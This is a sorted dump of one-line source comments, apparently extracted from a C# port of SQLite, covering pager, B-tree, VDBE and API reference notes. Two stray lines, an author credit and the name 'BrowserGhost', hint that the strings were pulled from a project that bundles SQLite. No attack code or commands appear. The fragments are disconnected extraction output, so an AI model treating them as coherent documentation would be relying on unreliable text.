 All variables must either be on the stack or dynamically allocated from
 Allocate VdbeCursor number iCur.  Return a pointer to it.  Return NULL
 Allocate a Expr node which joins as many as two subtrees.
 Allocate a VDBE
 Allocate a bitvec to use to store the set of pages rolled back 
 Allocate a block of register used to store the change record
 Allocate a cursor used to store the old.
 Allocate a cursors for the main database table and for all indices.
 Allocate a new Select structure and return a pointer to that
 Allocate a new cache.
 Allocate a new expression node from a zero-terminated token that has
 Allocate a new index in the main database file if P1==0 or in the
 Allocate a new page from the database file.
 Allocate a new page object initially associated with cache pCache.
 Allocate a new page. This page will become the right-sibling of
 Allocate a new table in the main database file if P1==0 or in the
 Allocate a page. The page that currently resides at pgnoRoot will
 Allocate a range of temporary registers and the KeyInfo needed
 Allocate a single new register for use to hold some intermediate result.
 Allocate additional space if needed 
 Allocate an extra register for limit
 Allocate and initialize a new Pager object and put a pointer to it
 Allocate and initialize the WhereInfo structure that will become the
 Allocate and populate an sqlite3_index_info structure. It is the
 Allocate and zero memory.
 Allocate k new pages.  Reuse old pages where possible.
 Allocate memory for the array aRegIdx[].  There is one entry in the
 Allocate memory from the gap in between the cell pointer array
 Allocate memory that is to be used and released right away.
 Allocate memory.  This routine is like sqlite3_malloc() except that it
 Allocate nByte bytes of space from within the B-Tree page passed
 Allocate nByte bytes of space using sqlite3_malloc(). If the
 Allocate or deallocate a block of nReg consecutive registers
 Allocate or return the aggregate context for a user function.  A new
 Allocate space for a new sqlite3_backup object 
 Allocate space for both the pJournal and pMaster file descriptors.
 Allocate space for memory structures
 Allocate space from a fixed size buffer.  Make 
 Allocate space to hold a new trigger step.  The allocated space
 Allocate the Bitvec to be tested and a linear array of
 Allocate the index structure.
 Allocate the new entry in the db.aDb[] array and initialise the schema
 Allocate the parsing context 
 Allocate the sqlite data structure 
 Allocate the sqlite3_index_info structure
 Allocated entries 
 Allocated size of aVTrans 
 Allocating a new entry in pPage.aCell[] implies that
 Allow extended %-conversions 
 Allow infinity precision 
 Allowed for internal use only 
 Allowed values for Tabe.tabFlags.
 Allowed values for et_info.flags
 Allowed values for the DB.flags field.
 Allowed values for the flags parameter to sqlite3PagerOpen().
 Allowed values of CollSeq.type:
 Allowed values of UnpackedRecord.flags
 Allowed values of VdbeOp.p3type
 Allowed values of WhereTerm.wtFlags
 Already allocated by sqlite3Pragma() 
 Already thrown the error if VDBE alloc failed 
 Also add a UTF-8 case-insensitive collation sequence. 
 Also check that the page number is in bounds.
 Also initialize regReturn to contain the address of the instruction
 Also write code to modify the sqlite_master table and internal schema
 Alternative compound select code generator for cases when there
 Alternative data destination 
 Although the mutex on the BtShared object that corresponds to
 Always close the journal file when dropping the database lock.
 Always defragment highly fragmented pages 
 Always so because of CursorMoveto() above 
 Amount of payload held locally 
 Amount of space allocated in zText 
 Amount of usable space on each page 
 Amount of zBuf[] currently used 
 Amount to pop the stack 
 An EXCLUSIVE_LOCK is obtained by locking all bytes in the range.
 An FKey structure is created and added to the table currently
 An O(n
 An OP_SetNumColumns is only useful if it occurs immediately before
 An ORDER BY or GROUP BY clause to resolve 
 An SQL operation that is interrupted will return [SQLITE_INTERRUPT].
 An SQL parser context.  A copy of this structure is passed through
 An SQL table corresponding to zName 
 An SQL user-function registered to do the work of an ATTACH statement. The
 An SQL user-function registered to do the work of an DETACH statement. The
 An SQLITE_IOERR_XXX error code is returned if a call to
 An SQLITE_MISUSE error occurred 
 An SQLITE_NOMEM error. 
 An [INSERT] that fails due to a constraint violation is not a
 An [sqlite3_file] object represents an open file in the OS
 An application-defined function is permitted to call other
 An array of Btree used here and needing locks 
 An array of root pages numbers for individual trees 
 An array to map all upper-case characters into their corresponding
 An assertion fails if P2 is not an integer.
 An attempt to read a column out of a subquery or other
 An attempt to read from an expired [BLOB handle] fails with an
 An attempt to set a limit smaller than -1 is a no-op.
 An attempt to write to an expired [BLOB handle] fails with an
 An authorizer is used when [sqlite3_prepare 
 An automatic index created by a PRIMARY KEY or UNIQUE constraint 
 An element of pSelect.pSrc 
 An empty string is considered non-numeric.
 An engine for executing database bytecode 
 An ephemeral string value (signified by the MEM_Ephem flag) contains
 An ephemeral table 
 An error has occurred writing to the journal file. The
 An error has occurred. Return an error code. 
 An error message 
 An error message is left in pParse if anything is amiss.  The number
 An examples of why this is not allowed:
 An exception to the above rule: If the database is in no-sync mode
 An existing b-tree may only be used if the SELECT is of the simple
 An existing page in the cache 
 An expired statement means that recompilation of the statement is
 An expression of the form ID or ID.ID refers to a column in a table.
 An extra 'b' is appended to the end of the string to cover the
 An implementation of the LockFile() API of windows for wince
 An implementation of the LockFileEx() API of windows for wince
 An implementation of the UnlockFile API of windows for wince
 An in-memory journal file should only ever be appended to. Random
 An index associated with pTab 
 An index to being analyzed 
 An index we are evaluating 
 An instance of struct TriggerStack stores information required during code
 An instance of struct TriggerStep is used to store a single SQL statement
 An instance of the following structure can be declared on a stack and used
 An instance of the following structure contains all information
 An instance of the following structure describes the event of a
 An instance of the following structure holds all information about a
 An instance of the following structure holds information about a
 An instance of the following structure holds the context of a
 An instance of the following structure is allocated for each active
 An instance of the following structure is passed as the first
 An instance of the following structure is used to hold information
 An instance of the following structure is used to store the busy-handler
 An instance of the following structure keeps track of a mapping
 An instance of the following structure stores a database schema.
 An instance of the sqlite3_vfs object defines the interface between
 An instance of the virtual machine.  This structure contains the complete
 An instance of this object defines the interface between SQLite
 An instance of this object represents a single SQL statement.
 An instance of this object represents a single database file.
 An instance of this object represents an open BLOB on which
 An instance of this object serves as a cursor into the rollback journal.
 An instance of this structure contains information needed to generate
 An instance of this structure defines the low-level routines
 An instance of this structure holds information about the
 An instance of this structure holds the ATTACH key and the key type.
 An instance of this structure is used by the parser to record both
 An integer is written into pRes which is the result of
 An object of this type is created for each virtual table present in
 An objected used to accumulate the text of a string where we
 An open database 
 An optimisation would be to use a non-journaled pager.
 An optimization. If the database was not actually modified during
 An ordinary table or view name in the FROM clause 
 An outer join of tables t1 and t2 is conceptally coded as follows:
 An tokenizer for SQL
 An unconditional jump to address P2.
 Analyze a term that consists of two or more OR-connected
 Analyze a term that is composed of two or more subterms connected by
 Analyze all of the subexpressions.  Note that exprAnalyze() might
 Analyze the ORDER BY clause in a compound SELECT statement.   Modify
 Analyze the SELECT statement passed as an argument to see if it
 Analyze the given expression looking for aggregate functions and
 And set the Expr.iRightJoinTable to iTable for every term in the
 And so forth.  This routine generates code to open those VDBE cursors
 And some windows compilers complain if you try to use it without
 Another SELECT immediately to our left 
 Another built-in collating sequence: NOCASE.
 Any SQL statement variables that had values bound to them using
 Any attempt to use these routines on an [unprotected sqlite3_value]
 Any callback set by a previous call to sqlite3_commit_hook()
 Any callback set by a previous call to this function
 Any constant without a fixed destination is appropriate 
 Any kind of inner or cross join 
 Any non-numeric characters that following zNum are ignored.
 Any other user-defined collating sequence 
 Any read-only or read-write transaction implies a read-lock on
 Any tables that the SrcList might point to are not duplicated.
 Any unrecognized conversion type 
 Anything that uses an index 
 Append N bytes of text from z to the StrAccum object.
 Append N space characters to the given string buffer.
 Append a message to the error message string.
 Append a new element to the given IdList.  Create a new IdList if
 Append a new table name to the given SrcList.  Create a new SrcList if
 Append a record of the current state of page pPg to the sub-journal.
 Append the new shared library handle to the db.aExtension array. 
 Append to this SrcList. NULL creates a new SrcList 
 Applications can choose to define yytestcase() in the %include section
 Applications can set this macro (for example inside %include) if
 Applications should [sqlite3_finalize 
 Applications should not use any of these parameters or the
 Applications that define a custom xFileControl method should use opcodes
 Applications that need to process SQL from untrusted sources
 Apply affinities to a range of P2 registers starting with P1.
 Apply the affinities Debug.Associated with the first n columns of index
 Argument Token 
 Argument pCsr must be a cursor opened for writing on an
 Argument pMem points at a register that will be passed to a
 Argument passed to comparison function 
 Argument rc is an SQLite error code. Return true if this error is
 Argument to pass to xBusyHandler 
 Argument to pass to xNotify 
 Argument to profile function 
 Argument to the deferred sqlite3BtreeMoveto() 
 Argument to the function 
 Argument to the progress callback 
 Argument to the trace function 
 Argument to xCommitCallback() 
 Argument to xInit() and xShutdown() 
 Argument to xRollbackCallback() 
 Argument to xStress 
 Argument to xUnlockNotify 
 Argument zMaster may point to Pager.pTmpSpace. So that buffer is not
 Argument zName is the name of the table in the database schema at
 Arguments to currently executing user function 
 Arguments to the unlock callback 
 Array for converting from half-bytes (nybbles) into ASCII hex
 Array of WHEN terms 
 Array of active savepoints 
 Array of collation sequence names for index 
 Array of objects.  Might be reallocated 
 Array of rootpage numbers for tables to be checked 
 Array of shared library handles 
 As well as the case where the destination database file was opened for
 As winMutexInit() and winMutexEnd() are called as part
 Assemble the new sibling page. 
 Assert that malloc() has not failed 
 Assert that the caller has been consistent. If this cursor was opened
 Assert that the caller has opened the required transaction. 
 Assert that the mutex (if any) associated with the BtShared database 
 Assert that the p1 parameter is valid. Also that if there is no open
 Assert that the pointer X is aligned to an 8-byte boundary.
 Assert that the root page is of the correct type. This must be the
 Assert that the values of parameters P1 and P4 are in range. 
 Assert()s verify that the computation is correct.
 Assign  cursor number to the table and all its indices.
 Assign VdbeCursor index numbers to all tables in a SrcList
 Assign a bit from the bitmask to every term in the FROM clause.
 Assign a variable number to an expression that encodes a wildcard
 Assigned value is never used 
 Associated database connection 
 Associated database handle 
 Assume 32-bit assignment is atomic 
 Assumed sector size during rollback 
 Assuming that after registering for an unlock-notify callback a 
 At first glance you would think we could optimize out the
 At least szOsFile bytes of memory are allocated by SQLite
 At least this one VM is active 
 At least two bugs have slipped in because we changed the MEMORY_DEBUG
 At most reg(P3) errors will be reported.
 At the conclusion of the test the linear array is compared
 At the moment there is only a UTF-8 implementation.
 At this point local variable rc holds the value that should be
 At this point pParent may have at most one overflow cell. And if
 At this point the transaction is committed but the write lock
 At this point there may be either a RESERVED or EXCLUSIVE lock on the
 At this point we have established that the statement is of the
 Attach subtrees pLeft and pRight to the Expr node pRoot.
 Attach the KeyInfo structure to all temporary tables.
 Attach the hook to this database 
 Attach the temporary database as 'vacuum_db'. The synchronous pragma
 Attempt the transfer optimization on INSERTs of the form
 Attempt to leave results in this register 
 Attempt to load an SQLite extension library contained in the file
 Attempt to locate an element of the hash table pH with a key
 Attempt to match pE against result set columns in the left-most
 Attempt to parse the given string into a Julian Day Number.  Return
 Attempt to read the database schema and initialize internal
 Attempt to release up to n bytes of non-essential memory currently
 Attempt to set the maximum database page count if mxPage is positive.
 Attempt to start a new transaction. A write-transaction
 Attempt to write a readonly database 
 Attempts to increase a limit above its hard upper bound are
 Author: Dwight Hohnstein (@djhohnstein)
 Authorization context 
 Authorization denied 
 Authorization to use the function 
 Authorize the subquery 
 Autocommit mode is disabled by a [BEGIN] statement.
 Autocommit mode is re-enabled by a [COMMIT] or [ROLLBACK].
 AutoincInfo structure is used.
 Automatically generated.  Do not edit 
 Autovac setting after VACUUM if >=0 
 Aux data for the i-th argument 
 Auxiliary database format error 
 Available fault injectors.  Should be numbered beginning with 0.
 Available memory locations begin here 
 Avoid leaking memory if malloc has failed. 
 Avoid memory leak when malloc fails 
 Ax 
 B - 1524.5 ) 
 B = t
 B has itself registered for an unlock-notify callback when connection
 B-Tree Database 
 B-Tree index search key 
 B-Tree is not marked as sharable.
 B-tree (non-LEAFDATA) tables.  A value of 255 means 100%.  The default
 B=t
 BEFORE 
 BEGIN 
 BETWEEN 
 BETWEEN term is skipped.
 BITVEC_NPTR - 1 ) / BITVEC_NPTR
 BITVEC_SZELEM )
 BLOB 
 BLOB value 
 BOM or Byte Order Mark:
 BTREE_AUTOVACUUM_FULL :
 BTREE_AUTOVACUUM_NONE :
 BTREE_INTKEY
 BTree containing table to open 
 BTrees.  Each BTree is identified by the index of its root page.  The
 BY 
 Back out changes but do no rollback transaction 
 Back pointer of the same list 
 Back up cursor P1 so that it points to the previous key/data pair in its
 Backup process error code 
 Base register 
 Base register for data coming from SELECT 
 Base register holding constraint values 
 Base register of data during check constraints 
 Base register where results are written 
 Be searching with the iFirst-th expression 
 Because the OP_NewRowid opcode in the VDBE depends on having a very
 Because there is no cross-platform way to specify 64-bit integer types
 Becomes true if any memory allocation fails 
 Becomes true if string size exceeds limits 
 Before reading the pages with page numbers larger than the
 Begin a loop that will extract all source rows in GROUP BY order.
 Begin a transaction
 Begin a transaction 
 Begin a transaction and code the VerifyCookie for database iDb.
 Begin a transaction and increment the schema cookie.  
 Begin a transaction.  The transaction ends when a Commit or Rollback
 Begin a write-transaction on the specified pager object. If a
 Begin accepting and shifting new tokens.  No new error
 Begin an individual statement transaction which is part of a larger
 Begin by generating some termination code at the end of the
 Begin by rolling back records from the main journal starting at
 Begin constructing a new table representation in memory.  This is
 Begin flattening the iFrom-th entry of the FROM clause
 Begin generating code.
 Begin generating the code that will insert the table record into
 Begin popping the stack until we enter a state where
 Begin reading at this offset 
 Begin reading this far into payload 
 Begin the database scan
 Begin writing at this offset into the file 
 Beginning here are the reduction cases.  A typical example
 Beginning of keyword text in zKeyText[] 
 Beginning of the header.  0 most pages.  100 page 1 
 Best index found so far 
 Best match found so far 
 Bias search to the high end 
 Binary tree of entries 
 Bind a blob value to an SQL statement variable.
 Bind a text or BLOB value.
 Bindings are not cleared by the [sqlite3_reset()] routine.
 Bit 0x20 is set if the mapped character requires translation to upper
 Bit N (1<<N) set if column N of pTab is used 
 Bit values for PgHdr.flags 
 Bitfield flags for P5 value in OP_Insert and OP_Delete
 Bitmap representation 
 Bitmask for pSrc 
 Bitmask identifying virtual table cursors 
 Bitmask of all indexable tables in the clause 
 Bitmask of db.aDb[] entries referenced 
 Bitmask of schema verified databases 
 Bitmask of tables referenced by pExpr 
 Bitmask of tables used by pExpr.pRight 
 Bitmask value for j or bestJ 
 Bitmasks for the operators that indices are able to exploit.  An
 Bitvec object is the number of pages in the database file at the
 Bitvec object.  Start with the assumption that they do
 Bitvec of pages already played back 
 Bitvec to ensure pages played back only once 
 Block of regs holding rowid
 Boolean settings.  UNPACKED_... below 
 Boolean values
 Boolean. True if locking_mode==EXCLUSIVE 
 Both pTable and pDatabase are assumed to be quoted.  They are dequoted
 Both sides of the comparison are columns. If one has numeric
 Both tables must have the same INTEGER PRIMARY KEY 
 Both values must be blobs.  Compare using memcmp().  
 Bounds of pagecache malloc range 
 Break the OR clause into its separate subterms.  The subterms are
 Breakup of pTerm into subterms 
 BrowserGhost
 BtCursor.info is a cache of the information in the current cell.
 BtShared address.  Then acquire our lock.  Then reacquire
 BtShared.pageSize bytes of space for tmp use 
 Btree 
 Btree connection pBtree:
 Btree cursor used for pIndex 
 Btree cursor used for pTab 
 Btree database to read cookie from 
 Btree handle holding this lock 
 Btree into the list of all sharable Btrees for the same connection.
 Btree page of current entry 
 Btree this cursor belongs to 
 Btree with currently open write transaction 
 Btree.  These entry points are used by incremental I/O and can be
 Btree.inTrans may take one of the following values.
 Btree.pBt value. All elements of the list should belong to
 Btrees belonging to the same database connection as the p Btree
 Buffer to deserialize from 
 Buffer used to create temp filename 
 Build a trigger step out of an INSERT statement.  Return a pointer
 Build the Trigger object 
 Building a VDBE program 
 Built-in count(
 Built-in functions may be overloaded by new application-defined functions.
 Busy callback 
 But a single Win95 reader will lock out all WinNT readers and a single
 But global versions of those functions
 But if (due to a coding error elsewhere in the system) it does get
 But no harm is done by this.  And it is very important that
 But other routines are also provided to help in building up
 But sometimes (for example when during a DROP of a large table) most
 But sqlite3SrcListShiftJoinType() later shifts the jointypes so that each
 But that file was getting too big so this subroutines were split out.
 But that is no longer true.  The limit is now strictly enforced
 But the feature is undocumented.
 But the following test is still important as it does come up
 But there is a good reason to not use the wrappers.  If we use the
 But there is a measureable speed advantage to using the macro on gcc
 But this file is the only place where the internal details of this
 But usually the problem will be seen.  The result will be an
 But we keep a reference count in Btree.wantToLock so the behavior
 Bx 
 Byte of unused space on each page 
 Byte offset of blob in cursor data 
 Byte offset of file to read from 
 Byte offset to previous journal header 
 Bytes buffered before opening the file 
 Bytes content per ovfl page 
 Bytes in key (not counting zero terminator) 
 Bytes in pPage beyond the header 
 Bytes of content in pCell 
 Bytes of header sector written 
 Bytes to allocate for PCache 
 Bytes to allocate for each journal fd 
 C ) / 100 )
 C - 4716 : C - 4715
 C programmers.
 C-style comments 
 CAPI3REF: 64-Bit Integer Types {H10200} <S10110>
 CAPI3REF: A Handle To An Open BLOB {H17800} <S30230>
 CAPI3REF: Application Defined Page Cache.
 CAPI3REF: Attempt To Free Heap Memory {H17340} <S30220>
 CAPI3REF: Authorizer Action Codes {H12550} <H12500>
 CAPI3REF: Authorizer Return Codes {H12590} <H12500>
 CAPI3REF: Automatically Load An Extensions {H12640} <S20500>
 CAPI3REF: Binding Values To Prepared Statements {H13500} <S70300>
 CAPI3REF: Close A BLOB Handle {H17830} <S30230>
 CAPI3REF: Closing A Database Connection {H12010} <S30100><S40200>
 CAPI3REF: Collation Needed Callbacks {H16700} <S20300>
 CAPI3REF: Column Names In A Result Set {H13720} <S10700>
 CAPI3REF: Commit And Rollback Notification Callbacks {H12950} <S60400>
 CAPI3REF: Compile-Time Authorization Callbacks {H12500} <S70100>
 CAPI3REF: Compile-Time Library Version Numbers {H10010} <S60100>
 CAPI3REF: Compiling An SQL Statement {H13010} <S10000>
 CAPI3REF: Configuration Options {H10160} <S20000>
 CAPI3REF: Configuration Options {H10170} <S20000>
 CAPI3REF: Configure database connections  {H14200} <S20000>
 CAPI3REF: Configuring The SQLite Library {H14100} <S20000><S30200>
 CAPI3REF: Constants Defining Special Destructor Behavior {H10280} <S30100>
 CAPI3REF: Convenience Routines For Running Queries {H12370} <S10000>
 CAPI3REF: Count The Number Of Rows Modified {H12240} <S10600>
 CAPI3REF: Create Or Redefine SQL Functions {H16100} <S20200>
 CAPI3REF: Custom Page Cache Object
 CAPI3REF: Data Change Notification Callbacks {H12970} <S60400>
 CAPI3REF: Database Connection For Functions {H16250} <S60600><S20200>
 CAPI3REF: Database Connection Handle {H12000} <S40200>
 CAPI3REF: Database Connection Status {H17500} <S60200>
 CAPI3REF: Declare The Schema Of A Virtual Table {H18280} <S20400>
 CAPI3REF: Declared Datatype Of A Query Result {H13760} <S10700>
 CAPI3REF: Define New Collating Sequences {H16600} <S20300>
 CAPI3REF: Deprecated Functions
 CAPI3REF: Destroy A Prepared Statement Object {H13300} <S70300><S30100>
 CAPI3REF: Determine If An SQL Statement Is Complete {H10510} <S70200>
 CAPI3REF: Device Characteristics {H10240} <H11120>
 CAPI3REF: Dynamically Typed Value Object {H15000} <S20200>
 CAPI3REF: Enable Or Disable Extended Result Codes {H12200} <S10700>
 CAPI3REF: Enable Or Disable Extension Loading {H12620} <S20500>
 CAPI3REF: Enable Or Disable Shared Pager Cache {H10330} <S30900>
 CAPI3REF: Error Codes And Messages {H12800} <S60200>
 CAPI3REF: Evaluate An SQL Statement {H13200} <S10000>
 CAPI3REF: Extended Result Codes {H10220} <S10700>
 CAPI3REF: Extract Metadata About A Column Of A Table {H12850} <S60300>
 CAPI3REF: File Locking Levels {H10250} <H11120> <H11310>
 CAPI3REF: Find The Database Handle Of A Prepared Statement {H13120} <S60600>
 CAPI3REF: Find the next prepared statement {H13140} <S60600>
 CAPI3REF: Flags For File Open Operations {H10230} <H11120> <H12700>
 CAPI3REF: Flags for the xAccess VFS method {H11190} <H11140>
 CAPI3REF: Formatted String Printing Functions {H17400} <S70000><S20000>
 CAPI3REF: Function Auxiliary Data {H16270} <S20200>
 CAPI3REF: Fundamental Datatypes {H10265} <S10110><S10120>
 CAPI3REF: Impose A Limit On Heap Size {H17350} <S30220>
 CAPI3REF: Index Of A Parameter With A Given Name {H13640} <S70300>
 CAPI3REF: Initialize The SQLite Library {H10130} <S20000><S30100>
 CAPI3REF: Interrupt A Long-Running Query {H12270} <S30500>
 CAPI3REF: Last Insert Rowid {H12220} <S10700>
 CAPI3REF: Load An Extension {H12600} <S20500>
 CAPI3REF: Low-Level Control Of Database Files {H11300} <S30800>
 CAPI3REF: Memory Allocation Routines {H10155} <S20120>
 CAPI3REF: Memory Allocation Subsystem {H17300} <S20000>
 CAPI3REF: Memory Allocator Statistics {H17370} <S30210>
 CAPI3REF: Mutex Handle {H17110} <S20130>
 CAPI3REF: Mutex Methods Object {H17120} <S20130>
 CAPI3REF: Mutex Types {H17001} <H17000>
 CAPI3REF: Mutex Verification Routines {H17080} <S20130> <S30800>
 CAPI3REF: Mutexes {H17000} <S20000>
 CAPI3REF: Name Of A Host Parameter {H13620} <S70300>
 CAPI3REF: Name Of The Folder Holding Temporary Files {H10310} <S20000>
 CAPI3REF: Number Of Columns In A Result Set {H13710} <S10700>
 CAPI3REF: Number Of SQL Parameters {H13600} <S70300>
 CAPI3REF: Number of columns in a result set {H13770} <S10700>
 CAPI3REF: OS Interface File Virtual Methods Object {H11120} <S20110>
 CAPI3REF: OS Interface Object {H11140} <S20100>
 CAPI3REF: OS Interface Open File Handle {H11110} <S20110>
 CAPI3REF: Obtain Aggregate Function Context {H16210} <S20200>
 CAPI3REF: Obtaining SQL Function Parameter Values {H15100} <S20200>
 CAPI3REF: One-Step Query Execution Interface {H12100} <S10000>
 CAPI3REF: Online Backup API.
 CAPI3REF: Online Backup Object
 CAPI3REF: Open A BLOB For Incremental I/O {H17810} <S30230>
 CAPI3REF: Opening A New Database Connection {H12700} <S40200>
 CAPI3REF: Overload A Function For A Virtual Table {H18300} <S20400>
 CAPI3REF: Prepared Statement Status {H17550} <S60200>
 CAPI3REF: Pseudo-Random Number Generator {H17390} <S20000>
 CAPI3REF: Query Progress Callbacks {H12910} <S60400>
 CAPI3REF: Read Data From A BLOB Incrementally {H17850} <S30230>
 CAPI3REF: Register A Callback To Handle SQLITE_BUSY Errors {H12310} <S40400>
 CAPI3REF: Register A Virtual Table Implementation {H18200} <S20400>
 CAPI3REF: Register A Virtual Table Implementation {H18210} <S20400>
 CAPI3REF: Reset A Prepared Statement Object {H13330} <S70300>
 CAPI3REF: Reset All Bindings On A Prepared Statement {H13660} <S70300>
 CAPI3REF: Reset Automatic Extension Loading {H12660} <S20500>
 CAPI3REF: Result Codes {H10210} <S10700>
 CAPI3REF: Result Values From A Query {H13800} <S10700>
 CAPI3REF: Retrieve the mutex for a database connection {H17002} <H17000>
 CAPI3REF: Retrieving Statement SQL {H13100} <H13000>
 CAPI3REF: Return The Size Of An Open BLOB {H17840} <S30230>
 CAPI3REF: Run-Time Library Version Numbers {H10020} <S60100>
 CAPI3REF: Run-Time Limit Categories {H12790} <H12760>
 CAPI3REF: Run-time Limits {H12760} <S20600>
 CAPI3REF: SQL Function Context Object {H16001} <S20200>
 CAPI3REF: SQL Statement Object {H13000} <H13010>
 CAPI3REF: SQLite Runtime Status {H17200} <S60200>
 CAPI3REF: Set A Busy Timeout {H12340} <S40410>
 CAPI3REF: Setting The Result Of An SQL Function {H16400} <S20200>
 CAPI3REF: Source Of Data In A Query Result {H13740} <S10700>
 CAPI3REF: Standard File Control Opcodes {H11310} <S30800>
 CAPI3REF: Status Parameters for database connections {H17520} <H17500>
 CAPI3REF: Status Parameters for prepared statements {H17570} <H17550>
 CAPI3REF: Status Parameters {H17250} <H17200>
 CAPI3REF: String Comparison
 CAPI3REF: Suspend Execution For A Short Time {H10530} <S40410>
 CAPI3REF: Synchronization Type Flags {H10260} <H11120>
 CAPI3REF: Test For Auto-Commit Mode {H12930} <S60200>
 CAPI3REF: Test To See If The Library Is Threadsafe {H10100} <S60100>
 CAPI3REF: Testing Interface Operation Codes {H11410} <H11400>
 CAPI3REF: Testing Interface {H11400} <S30800>
 CAPI3REF: Text Encodings {H10267} <S50200> <H16100>
 CAPI3REF: Total Number Of Rows Modified {H12260} <S10600>
 CAPI3REF: Tracing And Profiling Functions {H12280} <S60400>
 CAPI3REF: Unlock Notification
 CAPI3REF: User Data For Functions {H16240} <S20200>
 CAPI3REF: Virtual File System Objects {H11200} <S20100>
 CAPI3REF: Virtual Table Cursor Object  {H18020} <S20400>
 CAPI3REF: Virtual Table Indexing Information {H18100} <S20400>
 CAPI3REF: Virtual Table Instance Object {H18010} <S20400>
 CAPI3REF: Virtual Table Object {H18000} <S20400>
 CAPI3REF: Write Data Into A BLOB Incrementally {H17870} <S30230>
 CASCADE 
 CASE 
 CASE 1:
 CASE 2:
 CAST 
 CHAR 
 CHECK 
 CLOB 
 CODE
 COLLATE 
 COLNAME_N
 COLNAME_N )
 COLUMN 
 COMMIT 
 CONFLICT 
 CONSTRAINT 
 CPU and disk I/O need to process the request using the selected plan.
 CPU clock count at start of opcode 
 CP_ACP : CP_OEMCP
 CREATE 
 CREATE INDEX command. The second is a table name. The table name in
 CREATE INDEX statements are read out of the master table.  In
 CREATE TABLE t1(a)
 CREATE TABLE t1(c1 VARIANT)
 CREATE TABLE xxx.yyy (...)
 CREATE TABLE yyy(...)
 CREATE and TABLE.
 CROSS 
 CSE1 from below 
 CSE2 from below 
 CSSQLite.sqlite3_errmsg( db ) )
 CURRENT_DATE 
 CURRENT_TIME 
 CURRENT_TIMESTAMP 
 CURSOR_FAULT:
 CURSOR_INVALID:
 CURSOR_REQUIRESEEK:
 CURSOR_VALID : CURSOR_INVALID)
 CURSOR_VALID:
 Cache configuration parameters. Page size (szPage) and the purgeable
 Cache hits and missing 
 Cache is valid if this matches Vdbe.cacheCtr 
 Cache of overflow page locations 
 Cache page header this this page 
 Cache sharing is enabled and disabled for an entire process.
 Cache that currently owns this page 
 Cache that owns this page 
 Cached expression X 
 Cached information about the header for the data record that the
 Cached offsets to the start of each columns data 
 Calculate the length in bytes and the checksum of zMaster 
 Call SetAutoVacuum() to set initialize the internal auto and
 Call balance_quick() to create a new sibling of pPage on which
 Call either BtreeData() or BtreePutData(). If SQLITE_ABORT is
 Call exprAnalyze on all terms in a WHERE clause.
 Call lockBtree() until either pBt.pPage1 is populated or
 Call sqlite3ExprAnalyzeAggregates() for every expression in an
 Call sqlite3VdbeMemExpandBlob() on the supplied value (type Mem
 Call sqlite3WalkExpr() for every expression in Select statement p.
 Call sqlite3WalkExpr() for every expression in list p or until
 Call the %syntax_error function.
 Call the collation factory to see if it can supply us with one.
 Call the destructor for each auxdata entry in pVdbeFunc for which
 Call the progress callback if it is configured and the required number
 Call the xFindFunction method on the virtual table implementation
 Call this routine to delete a hash table or to reset a hash table
 Call this routine when freeing pages 
 Call this routine when reloading pages 
 Call this routine when the database connection is closing in order
 Call to try make a page clean 
 Call to try to make pages clean 
 Callback for SELECTs 
 Callback for expressions 
 Callback function 
 Callback function to invoke 
 Callback pointers 
 Callback routine requested an abort 
 Called by the parser to compile a DETACH statement.
 Called by the parser to compile an ATTACH statement.
 Calling [sqlite3_exec()] or [sqlite3_step()] recursively does
 Calling function guarantees this much 
 Calling sqlite3_free() with a pointer previously returned
 Calling this routine with a null pointer (which as would be returned
 Calling this routine with an argument less than or equal to zero
 Calls to [sqlite3_blob_read()] and [sqlite3_blob_write()] for
 Calls to the code generator in between sqlite3WhereBegin and
 Can not use an index sort on anything that is not a column in the
 Can only happen for leftward elements
 Can take a cached column of any affinity 
 Candidate for the LIKE optimization 
 Candidate values for BtLock.eLock 
 Cannot EXPRDUP_REDUCE this Expr 
 Cannot do OR REPLACE or OR IGNORE or OR FAIL 
 Cannot fail following BtreeLast() 
 Cannot have C without B 
 Cascade the changes 
 Case 0:  The table is a virtual-table.  Use the VFilter and VNext
 Case 1:     expr IN (SELECT ...)
 Case 1:  We can directly reference a single row using an
 Case 2:     expr IN (exprlist)
 Case 2:  We have an inequality comparison against the ROWID field.
 Case 3: A scan using an index.
 Case 4:  Two or more separately indexed terms connected by OR
 Case 5:  There is no usable index.  We must do a complete
 Case-sensitive LIKE-type function 
 Cases 1 and 2 are dealt with above by other code. The next
 Catch the case where the destination is an in-memory database and the
 Cause any pending operation to stop at its earliest opportunity.
 Cause precompiled statements to become expired. An expired statement
 Cause rootpage to be taken from top of stack 
 Causes schema cookie check after an error 
 Cell content is stored at the very end of the page and grows toward the
 Cell content makes use of variable length integers.  A variable
 Cell i is the cell immediately following the last cell on new
 Cell i is the cell immediately following the last cell on old
 Cells are of variable length.  Cells are stored in the cell content area at
 Cells iMem through iMem
 Cells that will not fit on aData[] 
 Chain of simple selects to delete 
 Change N opcodes starting at addr to No-ops.
 Change a page number.  Used by incr-vacuum. 
 Change the 'auto-vacuum' property of the database. If the 'autoVacuum'
 Change the P2 operand of instruction addr so that it points to
 Change the alarm callback
 Change the comment on the the most recently coded instruction.  Or
 Change the default pages size and the number of reserved bytes per page.
 Change the key on an open database.  If the current database is not
 Change the limit on the number of pages allowed in the cache.
 Change the magic from SQLITE_MAGIC_BUSY to SQLITE_MAGIC_OPEN.
 Change the maximum number of in-memory pages that are allowed.
 Change the page number of page p to newPgno.
 Change the page size for PCache object. The caller must ensure that there
 Change the page size used by the Pager object. The new page size
 Change the size of an existing memory allocation
 Change the sqlite.magic from SQLITE_MAGIC_OPEN to SQLITE_MAGIC_BUSY.
 Change the string value of an sqlite3_value object
 Change the value of a Mem to be a string or a BLOB.
 Change the value of a limit.  Report the old value.
 Change the value of the P1 operand for a specific instruction.
 Change the value of the P2 operand for a specific instruction.
 Change the value of the P3 operand for a specific instruction.
 Change the value of the P4 operand for a specific instruction.
 Change the value of the P5 operand for the most recently
 Change the way data is synced to disk in order to increase or decrease
 Changes in the GROUP BY are detected by the previous code
 Changes list for any UPDATE OF triggers 
 Changes to a view that are simulated by an [INSTEAD OF trigger]
 Changes whenever database file changes 
 Changes written into a BLOB prior to the BLOB expiring are not
 Changing the formula used to compute this checksum results in an
 Changing the pending byte during operating results in undefined
 Changing the value of PENDING_BYTE results in a subtly incompatible
 Changing this from a 64-bit to a 32-bit type limits the number of
 Characters. %c 
 Check all the tables.
 Check every term in the ORDER BY or GROUP BY clause pOrderBy of
 Check for a rowid=EXPR or rowid IN (...) constraints. If there was
 Check for authorization to create an index.
